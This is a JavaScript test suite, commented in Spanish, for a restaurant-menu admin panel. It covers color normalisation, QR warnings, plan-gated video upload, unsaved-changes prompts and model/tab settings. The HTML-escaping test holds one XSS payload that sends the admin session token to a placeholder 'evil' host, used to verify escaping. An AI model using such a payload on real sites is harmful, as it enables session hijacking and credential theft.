// Funciones que viven en el HTML del panel y en qr.js. No son módulos, así
// que se extraen del fuente y se evalúan: así se prueba el código que se
// despliega y no una copia que puede quedarse atrás.
const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const PUBLIC = path.join(__dirname, '..', 'public');

// Extrae el trozo de fuente entre dos marcas y lo evalúa en un contexto con
// los stubs que necesite.
function cargar(archivo, desde, hasta, contexto = {}) {
	const src = fs.readFileSync(path.join(PUBLIC, archivo), 'utf8');
	const i = src.indexOf(desde);
	const f = hasta ? src.indexOf(hasta, i) : src.length;
	assert.notEqual(i, -1, `no se encontró "${desde}" en ${archivo} — ¿se renombró?`);
	const ctx = vm.createContext(contexto);
	vm.runInContext(src.slice(i, f), ctx);
	return ctx;
}

// ═══════════════════════════════════════════════════════════════
describe('hex6 · normaliza colores para el selector nativo', () => {
	const { hex6 } = cargar('index.html', 'function hex6', '// El cuadrito y el campo');

	test('expande los hex de tres dígitos', () => {
		// <input type="color"> solo admite #rrggbb: un #abc lo dejaría en
		// negro y el cuadrito no coincidiría con lo escrito.
		assert.equal(hex6('#abc'), '#aabbcc');
		assert.equal(hex6('#AABBCC'), '#aabbcc');
	});

	test('acepta las formas razonables de escribir un color', () => {
		assert.equal(hex6('#ffd521'), '#ffd521');
		assert.equal(hex6('ffd521'), '#ffd521', 'sin almohadilla');
		assert.equal(hex6('  #ffd521  '), '#ffd521', 'con espacios');
	});

	test('lo inválido conserva el valor anterior, no salta a negro', () => {
		// Si saltara a negro, el diseño se movería solo mientras alguien
		// termina de teclear el color.
		for (const malo of ['#12345', 'rojo', '', null, undefined, '#zzzzzz'])
			assert.equal(hex6(malo, '#e91e63'), '#e91e63', `con ${JSON.stringify(malo)}`);
	});

	test('los colores que la plataforma usa hoy pasan intactos', () => {
		for (const c of ['#ffd521', '#f5a623', '#cdfefe', '#a374af', '#3d568c',
		                 '#3dd68c', '#12111a', '#1a1825', '#0a0a0f', '#000000', '#ffffff'])
			assert.equal(hex6(c), c);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('esc · escapado en el panel', () => {
	const { esc } = cargar('index.html', 'function esc(s)', 'let token =');

	test('el nombre de un producto no puede inyectar código', () => {
		// Importa más que en el menú público: el superadmin abre el panel de
		// CUALQUIER restaurante y su sesión vive en sessionStorage.
		const payload = '<img src=x onerror="fetch(\'//evil/\'+sessionStorage.menuAdminToken)">';
		const salida = esc(payload);
		assert.ok(!/<[a-zA-Z]/.test(salida), 'no debe quedar ninguna etiqueta');
		assert.ok(!salida.includes('"'), 'no debe quedar comilla que abra un atributo');
	});

	test('un nombre normal se muestra igual', () => {
		assert.equal(esc('HAMBURGUESA'), 'HAMBURGUESA');
		assert.equal(esc("PA' QUE NO JODA"), 'PA&#39; QUE NO JODA');
	});

	test('nulo no imprime la palabra "null"', () => {
		assert.equal(esc(null), '');
		assert.equal(esc(undefined), '');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('Diseñador de QR · avisos de escaneabilidad', () => {
	// qrRevisarAvisos y qrLeerControles leen del DOM; se les da uno falso.
	function preparar(cfgPrevia, entradas) {
		const campos = {
			qrColorFg:   { value: entradas.fg ?? '#000000' },
			qrColorOjos: { value: entradas.ojos ?? '' },
			qrColorBg:   { value: entradas.bg ?? '#ffffff' },
			qrCartelBg:  { value: '#111111' },
			qrCartelFg:  { value: '#ffffff' },
			qrTransparente: { checked: false },
			qrUsarLogo:  { checked: false },
			qrLogoTam:   { value: '22' },
			qrMargen:    { value: String(entradas.margen ?? 4) },
			qrCartelTitulo: { value: '' },
			qrCartelPie: { value: '' },
			qrAviso:     { textContent: '', style: {} },
		};
		const ctx = cargar('qr.js', 'const QR_HEX_RE', 'function qrElegirEstilo', {
			qrCfg: { ...cfgPrevia },
			document: { getElementById: id => campos[id] || null },
		});
		ctx.qrLeerControles();
		ctx.qrRevisarAvisos();
		return { aviso: campos.qrAviso.textContent, cfg: ctx.qrCfg };
	}

	test('un color mal escrito avisa y conserva el anterior', () => {
		// Canvas ignora en silencio un fillStyle inválido y se queda con el
		// del fondo: el QR salía en blanco sin que nada lo dijera.
		const { aviso, cfg } = preparar({ fg: '#e91e63', bg: '#ffffff' }, { fg: '#12345' });
		assert.match(aviso, /Color no válido/);
		assert.equal(cfg.fg, '#e91e63', 'no se pierde el color que ya funcionaba');
	});

	test('nombra los campos concretos que están mal', () => {
		const { aviso } = preparar({ fg: '#000000', bg: '#ffffff' }, { fg: 'rojo', bg: 'blanco' });
		assert.match(aviso, /los puntos y el fondo/);
	});

	test('los formatos válidos no se marcan como inválidos', () => {
		// Ojo: #abc es #aabbcc, un azul claro que sobre blanco sí dispara el
		// aviso de contraste. Eso es correcto; aquí solo interesa que no se
		// le acuse de estar mal escrito.
		for (const [entradas, etiqueta] of [
			[{ fg: '#abc' }, 'hex de 3 dígitos'],
			[{ fg: '#AABBCC' }, 'mayúsculas'],
			[{ ojos: '' }, 'esquinas vacío = igual que los puntos'],
			[{ fg: '#000000' }, 'hex completo'],
		]) assert.doesNotMatch(preparar({}, entradas).aviso, /Color no válido/, etiqueta);
	});

	test('un margen por debajo de la norma avisa', () => {
		// La norma del QR pide 4 módulos de zona de silencio; con menos,
		// muchos lectores fallan impreso junto a otros elementos.
		assert.match(preparar({}, { margen: 0 }).aviso, /Margen de 0 módulos/);
		assert.match(preparar({}, { margen: 1 }).aviso, /Margen de 1 módulo\b/, 'singular');
		assert.doesNotMatch(preparar({}, { margen: 4 }).aviso, /Margen/);
		assert.doesNotMatch(preparar({}, { margen: 8 }).aviso, /Margen/);
	});

	test('el aviso de contraste sigue funcionando', () => {
		assert.match(preparar({}, { fg: '#ffffff', bg: '#000000' }).aviso, /claro sobre fondo oscuro/);
		assert.match(preparar({}, { fg: '#777777', bg: '#888888' }).aviso, /poco contraste/);
		assert.equal(preparar({}, { fg: '#000000', bg: '#ffffff', margen: 4 }).aviso, '', 'negro sobre blanco, sin avisos');
	});

	test('varios problemas se listan juntos, no se pisan', () => {
		const { aviso } = preparar({ fg: '#000000' }, { fg: '###', margen: 0 });
		assert.ok(aviso.split('\n').length >= 2, 'debe verlos todos de una vez');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('pintarVideoPlato · la subida de video depende del plan', () => {
	// Esconder el grupo no es la seguridad —esa vive en POST /api/video—,
	// pero sí es lo que evita ofrecerle a un restaurante algo que no ha
	// contratado y que la API le va a rechazar.
	const pantalla = () => {
		const ids = ['videoGroup', 'videoEditPreview', 'videoEditVacio',
			'btnSubirVideo', 'videoUploadStatus', 'videoFileInput',
			'videoDesdeFila', 'btnConfirmarVideo', 'videoDesde', 'videoDesdeAviso'];
		const mapa = {};
		for (const id of ids) mapa[id] = {
			style: {}, textContent: '', value: '', disabled: false,
			removeAttribute() { delete this.src; },
		};
		return mapa;
	};

	const pintar = (videos, plato, mapa) => {
		const ctx = cargar('index.html', 'let vigilanciaVideo = null;',
			'// Elegir el archivo ya no lo sube', {
				clearInterval() {},
				planActual: () => ({ videos }),
				document: { getElementById: id => mapa[id] },
			});
		ctx.pintarVideoPlato(plato);
		return mapa;
	};

	test('un plan sin video no enseña la subida', () => {
		const m = pintar(false, { id: 'p1' }, pantalla());
		assert.equal(m.videoGroup.style.display, 'none');
	});

	test('el plan de video sí la enseña', () => {
		const m = pintar(true, { id: 'p1' }, pantalla());
		assert.equal(m.videoGroup.style.display, 'block');
	});

	test('un plato sin guardar no puede recibir video todavía', () => {
		// El video se cuelga de un producto_id que aún no existe. Dejar el
		// botón vivo mandaría la subida a un 400 sin explicar por qué.
		const m = pintar(true, null, pantalla());
		assert.equal(m.btnSubirVideo.disabled, true);
		assert.match(m.videoEditVacio.textContent, /Guarda el plato primero/);
	});

	test('un plato con video ya convertido lo muestra', () => {
		const url = 'https://ejemplo.test/uploads/videos/a.mp4';
		const m = pintar(true, { id: 'p1', atributos: { video: { url } } }, pantalla());
		assert.equal(m.videoEditPreview.src, url);
		assert.equal(m.videoEditPreview.style.display, 'block');
		assert.equal(m.videoEditVacio.style.display, 'none');
	});

	test('un plato sin video no arrastra el del anterior', () => {
		// El elemento <video> es el mismo para todos los platos: si no se le
		// quita el src, abrir un plato sin video enseña el del que se miró antes.
		const m = pantalla();
		pintar(true, { id: 'p1', atributos: { video: { url: 'https://ejemplo.test/a.mp4' } } }, m);
		pintar(true, { id: 'p2' }, m);
		assert.equal(m.videoEditPreview.src, undefined, 'debe soltar el src del plato anterior');
		assert.equal(m.videoEditPreview.style.display, 'none');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('avisarSiSePasaElVideo · el trozo elegido tiene que caber', () => {
	// Se guardan 8 segundos desde el punto que marque el restaurante. Si
	// elige uno donde ya no quedan 8, el video sale más corto — y eso se
	// sabe antes de subir nada, no después de esperar minuto y medio a que
	// ffmpeg termine.
	const conVideo = (duracion, desde) => {
		const mapa = {
			videoEditPreview:  { duration: duracion },
			videoDesde:        { value: String(desde) },
			videoDesdeAviso:   { textContent: 'sucio' },
			btnConfirmarVideo: { disabled: false, style: {} },
		};
		const ctx = cargar('index.html', 'const DURACION_MIN_VIDEO',
			'async function confirmarSubidaVideo',
			{ document: { getElementById: id => mapa[id] } });
		ctx.avisarSiSePasaElVideo();
		return { aviso: mapa.videoDesdeAviso.textContent, bloqueado: mapa.btnConfirmarVideo.disabled };
	};

	test('con hueco de sobra no dice nada', () => {
		assert.equal(conVideo(30, 5).aviso, '', 'quedan 25 s, no hay nada que avisar');
	});

	test('justo en el límite tampoco', () => {
		assert.equal(conVideo(30, 22).aviso, '', 'quedan exactamente 8 s');
	});

	test('avisa cuando el trozo se queda corto', () => {
		assert.match(conVideo(30, 26).aviso, /4\.0 s/, 'quedan 4 s y hay que decirlo');
	});

	test('no muestra segundos negativos si se pasa del final', () => {
		// Escribir 40 en un video de 30 daba "-10.0 s", que no significa nada.
		assert.match(conVideo(30, 40).aviso, /0\.0 s/);
	});

	test('sin metadatos todavía no aventura nada', () => {
		// La duración no se conoce hasta loadedmetadata; hasta entonces es NaN
		// y un aviso calculado con eso sería basura.
		assert.equal(conVideo(NaN, 5).aviso, '');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('avisarSiSePasaElVideo · lo demasiado corto no se sube', () => {
	// Idea del propio usuario, y es mejor que convertirlo igual: un bucle de
	// un segundo en una carta marea. Más vale decirlo antes de que suban
	// treinta megas para nada.
	const conVideo = (duracion, desde) => {
		const mapa = {
			videoEditPreview:  { duration: duracion },
			videoDesde:        { value: String(desde) },
			videoDesdeAviso:   { textContent: '' },
			btnConfirmarVideo: { disabled: false, style: {} },
		};
		const ctx = cargar('index.html', 'const DURACION_MIN_VIDEO',
			'async function confirmarSubidaVideo',
			{ document: { getElementById: id => mapa[id] } });
		ctx.avisarSiSePasaElVideo();
		return { aviso: mapa.videoDesdeAviso.textContent, bloqueado: mapa.btnConfirmarVideo.disabled };
	};

	test('un video de un segundo no deja subir', () => {
		const r = conVideo(1, 0);
		assert.equal(r.bloqueado, true);
		assert.match(r.aviso, /al menos 3/);
	});

	test('justo en el mínimo sí deja', () => {
		assert.equal(conVideo(3, 0).bloqueado, false, '3 s exactos son válidos');
	});

	test('un video largo con el punto casi al final tampoco deja', () => {
		// Lo que importa no es cuánto dura el original sino cuánto queda desde
		// donde empieza el recorte.
		assert.equal(conVideo(40, 38).bloqueado, true, 'quedan 2 s de 40');
		assert.equal(conVideo(40, 30).bloqueado, false, 'quedan 10 s');
	});

	test('volver a un punto válido vuelve a permitir', () => {
		// El botón se deshabilita, y si no se rehabilitara al corregir el
		// número el usuario se quedaría encerrado sin saber por qué.
		assert.equal(conVideo(20, 19).bloqueado, true);
		assert.equal(conVideo(20, 5).bloqueado, false);
	});

	test('sin metadatos no se bloquea nada', () => {
		// La duración llega con loadedmetadata. Bloquear antes dejaría el botón
		// muerto en los milisegundos previos y parecería roto.
		assert.equal(conVideo(NaN, 0).bloqueado, false);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('cambios sin guardar · la ficha no se cierra en silencio', () => {
	// Un clic fuera del modal lo cerraba y se llevaba lo escrito. Se compara
	// una firma del formulario en vez de levantar una bandera al primer
	// tecleo: escribir algo y borrarlo no debe contar como cambio, porque
	// preguntar cuando no hay nada que perder enseña a decir que sí sin leer.
	const montar = ({ videoElegido = null } = {}) => {
		const mapa = {
			editNombre:       { value: 'Croquetas' },
			editCategoria:    { value: 'cat-1' },
			editPrecioNum:    { value: '24000' },
			editDesc:         { value: '' },
			editDescAvanzada: { value: '' },
			editDisponible:   { checked: true },
		};
		const abiertos = [], cerrados = [];
		const ctx = cargar('index.html', 'function firmaProducto', 'async function saveProduct', {
			state: { pendingImgUrl: null, extraImgs: [], prodFiltros: [], prodBadges: {} },
			videoElegido,
			document: { getElementById: id => mapa[id] },
			openModal:  id => abiertos.push(id),
			closeModal: id => cerrados.push(id),
		});
		return { ctx, mapa, abiertos, cerrados };
	};

	test('sin tocar nada, no hay cambios', () => {
		const { ctx } = montar();
		ctx.fijarFirmaProducto();
		assert.equal(ctx.productoTieneCambios(), false);
	});

	test('cambiar un campo cuenta como cambio', () => {
		const { ctx, mapa } = montar();
		ctx.fijarFirmaProducto();
		mapa.editNombre.value = 'Croquetas de jamón';
		assert.equal(ctx.productoTieneCambios(), true);
	});

	test('escribir y deshacer NO cuenta como cambio', () => {
		// Lo que evita el aviso inútil que la gente aprende a ignorar.
		const { ctx, mapa } = montar();
		ctx.fijarFirmaProducto();
		mapa.editPrecioNum.value = '99000';
		assert.equal(ctx.productoTieneCambios(), true, 'mientras está cambiado, sí');
		mapa.editPrecioNum.value = '24000';
		assert.equal(ctx.productoTieneCambios(), false, 'al volver al valor original, no');
	});

	test('el interruptor de disponible también cuenta', () => {
		const { ctx, mapa } = montar();
		ctx.fijarFirmaProducto();
		mapa.editDisponible.checked = false;
		assert.equal(ctx.productoTieneCambios(), true);
	});

	test('un video elegido y sin subir es trabajo por perder', () => {
		// Hay que volver a buscar el archivo y a marcar el segundo de inicio.
		const { ctx } = montar({ videoElegido: { name: 'plato.mp4' } });
		ctx.fijarFirmaProducto();
		assert.equal(ctx.productoTieneCambios(), false, 'si ya estaba al abrir, no es un cambio');

		const otra = montar();
		otra.ctx.fijarFirmaProducto();
		// Simular que se elige un archivo después de abrir la ficha.
		otra.ctx.videoElegido = { name: 'plato.mp4' };
		assert.equal(otra.ctx.productoTieneCambios(), true);
	});

	test('sin cambios, cerrar cierra directo', () => {
		const { ctx, abiertos, cerrados } = montar();
		ctx.fijarFirmaProducto();
		ctx.intentarCerrarProducto();
		assert.deepEqual(cerrados, ['productModal']);
		assert.deepEqual(abiertos, [], 'no hay por qué preguntar nada');
	});

	test('con cambios, cerrar pregunta antes', () => {
		const { ctx, mapa, abiertos, cerrados } = montar();
		ctx.fijarFirmaProducto();
		mapa.editNombre.value = 'Otra cosa';
		ctx.intentarCerrarProducto();
		assert.deepEqual(abiertos, ['cambiosModal']);
		assert.deepEqual(cerrados, [], 'la ficha sigue abierta hasta que decida');
	});

	test('salir sin guardar cierra las dos ventanas', () => {
		const { ctx, mapa, cerrados } = montar();
		ctx.fijarFirmaProducto();
		mapa.editNombre.value = 'Otra cosa';
		ctx.salirSinGuardar();
		assert.deepEqual(cerrados, ['cambiosModal', 'productModal']);
	});

	test('sin firma fijada no molesta', () => {
		// Estado de arranque, antes de abrir ninguna ficha: no hay nada que
		// comparar y no se puede inventar un cambio.
		const { ctx } = montar();
		assert.equal(ctx.productoTieneCambios(), false);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('ajustarFichaAlModelo · cada modelo enseña lo suyo', () => {
	// La misma ficha sirve para los cinco modelos. Un control que no hace
	// nada es peor que no tenerlo: quien lo usa cree que está trabajando.
	const conModelo = nav => {
		const mapa = {
			extraImgsGroup: { style: {} },
			labelImagen:    { innerHTML: '' },
		};
		const ctx = cargar('index.html', 'function ajustarFichaAlModelo',
			'// ── CAMBIOS SIN GUARDAR', {
				state: { restaurante: { atributos: { nav } } },
				document: { getElementById: id => mapa[id] },
			});
		ctx.ajustarFichaAlModelo();
		return mapa;
	};

	test('el modelo de video esconde las imágenes adicionales', () => {
		// temas/video.js no lee atributos.imagenes en ninguna parte: subirlas
		// ahí es subirlas para nadie.
		assert.equal(conModelo('video').extraImgsGroup.style.display, 'none');
	});

	test('los demás modelos las siguen enseñando', () => {
		for (const nav of ['topnav', 'sidebar', 'carrito', 'explorar'])
			assert.equal(conModelo(nav).extraImgsGroup.style.display, '', `en ${nav}`);
	});

	test('en video, la foto se explica como respaldo', () => {
		// Deja de ser lo que se ve y pasa a ser lo que se ve mientras no haya
		// video. Eso hay que decirlo donde se mira, no en un manual.
		assert.match(conModelo('video').labelImagen.innerHTML, /mientras el plato no tenga video/);
	});

	test('en los demás la etiqueta se queda limpia', () => {
		assert.equal(conModelo('topnav').labelImagen.innerHTML, 'Imagen');
	});

	test('un restaurante sin modelo declarado no se rompe', () => {
		// atributos.nav vacío es 'topnav' por defecto en el menú público.
		const mapa = conModelo(undefined);
		assert.equal(mapa.extraImgsGroup.style.display, '');
		assert.equal(mapa.labelImagen.innerHTML, 'Imagen');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('personalizacionDe · traducir los platos viejos', () => {
	// Los tres productos originales llevaban una copia del catálogo dentro.
	// Al abrir su ficha se traduce a la forma nueva —solo nombres— para que
	// el restaurante los vea ya marcados y queden migrados al guardar.
	const crudo = () => cargar('index.html', 'function personalizacionDe',
		'function renderPersonalizacion', {}).personalizacionDe;

	// El vm corre en otro realm: lo que crea allí no comparte prototipos con
	// lo de aquí y deepEqual estricto lo rechaza aunque la forma coincida.
	const traducir = p => JSON.parse(JSON.stringify(crudo()(p)));

	test('un plato ya migrado se lee tal cual', () => {
		assert.deepEqual(traducir({ atributos: { personalizacion: {
			platino: ['Cebolla'], premium: ['Tocineta'], salsas: ['BBQ'],
		} } }), { platino: ['Cebolla'], premium: ['Tocineta'], salsas: ['BBQ'] });
	});

	test('de la copia vieja se queda solo con los nombres', () => {
		// El precio deja de viajar con el plato: pasa a salir siempre del
		// catálogo del negocio, que es lo que arregla el fallo.
		const r = traducir({ atributos: {
			toppings_platino: ['Cebolla', 'Tomate'],
			toppings_premium: [{ nombre: 'Tocineta', precio: 4000 }],
			salsas: ['BBQ'],
		} });
		assert.deepEqual(r.premium, ['Tocineta'], 'sin el precio dentro');
		assert.deepEqual(r.platino, ['Cebolla', 'Tomate']);
	});

	test('un plato nuevo empieza vacío', () => {
		assert.deepEqual(traducir({ atributos: {} }),
			{ platino: [], premium: [], salsas: [] });
	});

	test('no se queda con referencias a los arreglos del producto', () => {
		// Si compartiera el arreglo, marcar un chip modificaría el producto en
		// memoria y "cambios sin guardar" no vería nada que comparar.
		const p = { atributos: { personalizacion: { platino: ['Cebolla'], premium: [], salsas: [] } } };
		crudo()(p).platino.push('Tomate');
		assert.deepEqual(p.atributos.personalizacion.platino, ['Cebolla'], 'el producto no se toca');
	});

	test('una copia vieja con entradas rotas no las arrastra', () => {
		const r = traducir({ atributos: {
			toppings_premium: [{ nombre: 'Tocineta', precio: 4000 }, { precio: 1000 }, null],
		} });
		assert.deepEqual(r.premium, ['Tocineta']);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('tabla de planes del panel', () => {
	// Es un espejo de core/planes.js del menú público: dos aplicaciones
	// desplegadas por separado que deben decir lo mismo. Si divergen, el
	// panel ofrece algo que la carta no pinta, o al revés.
	//
	// Se entra por planDe y no por PLANES a propósito: un 'const' no se
	// engancha al contexto del vm —solo las declaraciones de función—, y de
	// paso se prueba el accesor que usa el panel de verdad.
	const { planDe } = cargar('index.html', 'const PLANES = {', 'function planActual');
	const PLANES_NOMBRES = ['vitrina', 'pedidos', 'completo', 'video'];
	const plan = nombre => planDe({ atributos: { plan: nombre } });

	test('todos los planes declaran todas las capacidades', () => {
		// Una bandera que falta se lee como undefined, o sea como "no", y un
		// plan pierde algo sin que nadie lo haya decidido.
		const banderas = ['marca', 'qr_disenador', 'estadisticas', 'horarios', 'videos', 'carrito'];
		for (const nombre of PLANES_NOMBRES)
			for (const b of banderas)
				assert.equal(typeof plan(nombre)[b], 'boolean', `${nombre} no declara "${b}"`);
	});

	test('el carrito es capacidad de plan, no solo modelo de página', () => {
		assert.equal(plan('vitrina').carrito, false, 'vitrina es solo escaparate');
		assert.equal(plan('pedidos').carrito, true);
		assert.equal(plan('completo').carrito, true);
		assert.equal(plan('video').carrito, true);
	});

	test('el modelo de video solo lo lista el plan de video', () => {
		for (const n of ['vitrina', 'pedidos', 'completo'])
			assert.equal(plan(n).modelos.includes('video'), false, `${n} no debería`);
		assert.ok(plan('video').modelos.includes('video'));
	});

	test('un plan desconocido no deja al restaurante sin nada', () => {
		// Un valor mal escrito en la base no puede apagarle el panel a nadie.
		assert.equal(typeof plan('platino_ultra').carrito, 'boolean');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('navElegido · guardar Apariencia no puede dejar sin modelo', () => {
	// Un <select> al que se le asigna un valor que no está entre sus opciones
	// se queda con "". Y "" en nav lo lee loader.js como falso y cae a topnav:
	// una carta en video se convertía en carta de fotos al pulsar Guardar.
	const elegir = (valorDelSelect, navGuardado) => {
		const ctx = cargar('index.html', 'function navElegido', '// Aplica las restricciones', {
			state: { restaurante: { atributos: navGuardado === undefined ? {} : { nav: navGuardado } } },
			document: { getElementById: () => ({ value: valorDelSelect }) },
		});
		return ctx.navElegido();
	};

	test('se guarda lo que elige el usuario', () => {
		assert.equal(elegir('sidebar', 'topnav'), 'sidebar');
		assert.equal(elegir('video', 'topnav'), 'video');
	});

	test('un desplegable sin la opción no borra el modelo', () => {
		// El caso exacto que rompió Voro.
		assert.equal(elegir('', 'video'), 'video');
	});

	test('sin nada de dónde tirar, topnav', () => {
		// topnav es el modelo por defecto del menú público: es la respuesta
		// segura, no una elección.
		assert.equal(elegir('', undefined), 'topnav');
	});

	test('nunca devuelve cadena vacía', () => {
		for (const [sel, guardado] of [['', ''], ['', null], ['', undefined], ['', 'carrito']])
			assert.notEqual(elegir(sel, guardado), '', `con ${JSON.stringify([sel, guardado])}`);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('ajustarPestanasAlModelo · donde hay carrito hay Pedidos', () => {
	// La pestaña Pedidos es donde se pone el WhatsApp al que llegan los
	// pedidos. Sin ella el cliente arma el suyo y no llega a ningún sitio,
	// sin ninguna pista de que falta configurar algo.
	const conAtributos = (atributos, plan = { carrito: true }) => {
		const mapa = {
			tabBtnToppings: { style: {} },
			tabBtnPedidos:  { style: {} },
		};
		const ctx = cargar('index.html', 'function ajustarPestanasAlModelo',
			'// Qué modelo se guarda', {
				state: { restaurante: { atributos } },
				planActual: () => plan,
				document: { getElementById: id => mapa[id] },
				renderPedidos() {}, renderMetodosPago() {},
			});
		ctx.ajustarPestanasAlModelo();
		return { pedidos: mapa.tabBtnPedidos.style.display, toppings: mapa.tabBtnToppings.style.display };
	};

	test('el modelo carrito siempre las tiene', () => {
		assert.equal(conAtributos({ nav: 'carrito' }).pedidos, 'block');
	});

	test('el modelo video con el carrito encendido también', () => {
		// Es lo que faltaba: se encendía el carrito en video y no había dónde
		// poner el número.
		assert.equal(conAtributos({ nav: 'video', carrito: true }).pedidos, 'block');
	});

	test('el modelo video sin carrito no las enseña', () => {
		assert.equal(conAtributos({ nav: 'video', carrito: false }).pedidos, 'none');
	});

	test('sin el plan no se enseñan aunque el interruptor esté puesto', () => {
		// El interruptor puede quedar encendido de un plan anterior. Manda el
		// plan de hoy, igual que en la carta.
		assert.equal(conAtributos({ nav: 'video', carrito: true }, { carrito: false }).pedidos, 'none');
	});

	test('un restaurante con toppings de antes conserva su pestaña', () => {
		// Aunque ya no tenga carrito: son datos suyos y debe poder verlos.
		const r = conAtributos({ nav: 'topnav', salsas: ['BBQ'] }, { carrito: false });
		assert.equal(r.toppings, 'block');
		assert.equal(r.pedidos, 'none');
	});
});
